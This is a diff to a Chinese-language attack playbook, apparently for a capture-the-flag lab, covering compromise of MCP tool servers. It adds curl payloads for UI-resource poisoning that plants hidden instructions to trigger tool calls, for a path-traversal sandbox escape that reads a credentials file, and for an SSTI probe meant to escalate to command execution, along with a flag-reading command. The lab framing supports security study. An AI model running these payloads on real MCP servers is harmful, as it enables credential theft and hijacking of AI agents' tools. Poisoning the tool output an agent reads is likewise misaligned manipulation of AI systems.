@@ -14,7 +14,7 @@ output: 每攻击步骤「命令 + 输出 + 截图」证据、工具投毒前后
 
 ## 执行体
 
-按「定位 MCP 工具面 → 恶意 server 投毒 → 工具滥用/调用劫持 → 权限提升 → flag 取证」顺序推进，每步经 `tools/collect_evidence.py` 落盘证据，未过质量门不得进入下一步。
+按「定位 MCP 工具面 → 恶意 server 投毒 → 工具滥用/调用劫持 → 权限提升 → flag 取证 → Ch7 增量（UI 投毒 / 沙箱逃逸 / 工具链注入）」顺序推进，每步经 `tools/collect_evidence.py` 落盘证据，未过质量门不得进入下一步。
 
 ### 前置：定位 MCP 工具面
 
@@ -58,6 +58,26 @@ output: 每攻击步骤「命令 + 输出 + 截图」证据、工具投毒前后
    - 命令：`whoami; id; find / -name ai_vector.txt 2>/dev/null -exec cat {} \;`
    - 证据：`python tools/collect_evidence.py --step mcp-08 --cmd "whoami; id; find / -name ai_vector.txt 2>/dev/null -exec cat {} \;" --out loot/mcp-08-flag.md --shot-cmd "screenshot --region flag_proof" --ai-log "见 loot/mcp-08-flag.md" --flag "<ai_vector.txt 值>" --target <AI_VECTOR_HOST> --strict`
 2. 取证须含访问证明：`whoami`/`id` + flag 内容同屏截图（对齐 §6.2 双通道一致）。
+
+### 攻击路径 D — MCP Apps UI 投毒与 AppBridge 外泄（mcp-10）
+
+1. **mcp-10 MCP Apps UI 投毒**：在工具返回的 `_meta.ui.resourceUri` 注入 UI 资源与隐藏指令，经双层 iframe 沙箱代理触发 `postMessage` → `tools/call`，把渲染面变成调用面。
+   - 命令：`curl -s -X POST <MCP_ENDPOINT> -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"track_time","arguments":{}},"id":1}'`
+   - 证据：`python tools/collect_evidence.py --step mcp-10 --cmd "curl -s -X POST <MCP_ENDPOINT> -d '<_meta.ui 注入 payload>'" --out loot/mcp-10-ui-poison.md --shot-cmd "screenshot --region ui_iframe" --target <MCP_ENDPOINT> --strict`
+
+### 攻击路径 E — 沙箱逃逸：路径穿越 + symlink（mcp-09）
+
+1. **mcp-09 沙箱逃逸**：验证「前缀检查早于路径规范化」的穿越缺陷与 symlink 跟随，取得沙箱外文件读取，并给出 `realpath` 修复对照。
+   - 命令：`curl -s -X POST <MCP_ENDPOINT> -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"read_file","arguments":{"path":"/data/documents/../.secrets/credentials.json"}},"id":1}'`
+   - 证据：`python tools/collect_evidence.py --step mcp-09 --cmd "curl -s -X POST <MCP_ENDPOINT> -d '<穿越 payload>'" --out loot/mcp-09-sandbox-escape.md --shot-cmd "screenshot --region escape" --target <MCP_ENDPOINT> --strict`
+
+### 攻击路径 F — 工具链注入：SSTI → 命令执行（mcp-11）
+
+1. **mcp-11 工具链注入**：串联 store → aggregate → render 三个工具，先用 `{{7*7}}` 探针确认模板执行面，再升级为命令执行载荷。
+   - 命令：`curl -s -X POST <MCP_ENDPOINT> -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"update_ticket","arguments":{"body":"{{7*7}}"}},"id":1}'`
+   - 证据：`python tools/collect_evidence.py --step mcp-11 --cmd "curl -s -X POST <MCP_ENDPOINT> -d '<SSTI 载荷>'" --out loot/mcp-11-ssti-chain.md --shot-cmd "screenshot --region render_ssti" --target <MCP_ENDPOINT> --strict`
+
+> 路径 D/E/F 为 Ch7 增量，标识 `mcp-09`…`mcp-11` 与实现 `tools/attack_mcp_tool/steps.py:STEP_SPECS` 一一对应；证据格式与路径 A–C 相同，可单步复现（`--step mcp-09|mcp-10|mcp-11`）。
 
 ## 质量门
 
